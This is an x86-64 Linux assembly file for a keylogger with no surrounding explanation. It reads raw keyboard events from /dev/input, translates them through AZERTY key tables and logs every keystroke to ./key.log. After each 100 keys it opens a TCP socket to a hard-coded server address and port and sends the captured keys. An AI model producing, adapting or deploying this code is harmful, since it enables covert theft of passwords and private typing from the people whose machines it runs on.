section .text
    global capture_keys

capture_keys:
  ; create/open the key.log file to store the captured keys
  ; then store file descriptor into fd
  ; and check if all works correctly, if not jmp to error
  mov rax, 2
  mov rdi, file
  mov rsi, 00001102
  mov rdx, 422
  syscall

  mov [fd], rax

  test rax, rax
  js error

  ; open /dev/input/eventX to read all keys from input
  ; then store the file descriptor to sd
  ; and check if we can open it, if not jmp to error
  mov rax, 2
  mov rdi, r10 
  xor rsi, rsi
  syscall

  mov [sd], rax

  test rax, rax
  js error

 .read_keys:
    xor rax, rax
    mov rsi, event
    mov rdx, 24
    mov rdi, [sd]
    syscall
 
    mov byte al, [event + 16]
    cmp ax, 0x0
    je .read_keys
    cmp ax, 0x4
    je .read_keys
 
    mov byte al, [event + 18]
    cmp al, 42
    je .check_shift
 
    cmp al, 54
    je .check_shift
 
    mov byte al , [event + 20]
    cmp al, 0x0
    je .read_keys
 
    mov byte al , [event + 18]
    cmp byte [mode], 1
    je  .upper_key
    jne  .lower_key

 .check_shift:
    mov byte al, [event + 20]
    cmp al, 0x1
    je .press_shift
    jne  .release_shift

 .press_shift:
    mov byte [mode], 1
    jmp .read_keys

 .release_shift:
    mov byte [mode], 0
    jmp .read_keys

 .upper_key:
    mov byte bl, [upperKeys + eax] 
    mov byte [key], bl

    jmp .write_key

 .lower_key:
    mov byte bl, [lowerKeys + eax]
    mov byte [key], bl

    jmp .write_key

 .write_key:
   mov rax, 1
   mov rdi, [fd]
   mov rsi, key
   mov rdx, 1
   syscall
 
   mov al, [counter]
   mov bl, [key]
   mov byte [keys + eax],bl 
 
   add byte [counter], 1
   cmp byte [counter], 100
   je .send_keys
 
   jmp .read_keys 
 
 .send_keys:
   mov rax, 41
   mov rdi, 0x2 
   mov rsi, 0x1
   xor rdx, rdx
   syscall
  
   mov [socket], rax
 
   mov rax, 42
   mov rdi, [socket]
 
   mov word [addr], 0x2 
   mov bx, [port]
   mov word [addr + 2], bx 
   mov ebx, [serv]
   mov dword [addr + 4], ebx 
  
   mov rsi, addr
   mov rdx, 16
   syscall
 
   test rax, rax
   jnz .read_keys
 
   mov rax, 1
   mov rdi, [socket]
   mov rsi, keys
   mov rdx, 100
   syscall
 
   mov rax, 3
   mov rdi, [socket]
   syscall
 
   mov byte [counter], 0
   jmp .read_keys

section .data
  sd dq 0

  file db "./key.log", 0
  fd dq 0

  lowerKeys dw `??\&2\"\'(\-7\_90-=\b\tazertyuiop[]\n?qsdfghjklm,'\`?\wxcvbn,.:?*?\s?`
  upperKeys dw `??1234567890-=\b\tAZERTYUIOP[]\n?QSDFGHJKLM,'\`?\WXCVBN?./?*?\s?`

  serv dd 0x0100007f
  port dw 0x3905

  socket dq 0

  mode db 0
  counter db 0

section .bss
  key resb 1
  keys resb 100
  addr resb 16
  event resb 64
